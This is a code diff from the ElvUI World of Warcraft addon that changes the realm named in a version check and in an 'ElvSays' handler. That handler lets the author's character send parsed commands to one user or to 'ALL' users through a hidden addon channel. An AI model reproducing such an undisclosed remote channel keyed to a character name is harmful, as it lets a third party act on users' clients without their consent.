@@ -425,12 +425,12 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Kil'jaeden") and not E.recievedOutOfDateMessage then
+		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Spirestone") and not E.recievedOutOfDateMessage then
 			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Kil'jaeden") or find(sender, "Elvz%-Kil'jaeden")) then ---HAHHAHAHAHHA
+		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then ---HAHHAHAHAHHA
 			local user, channel, msg, sendTo = split(',', message)
 			
 			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
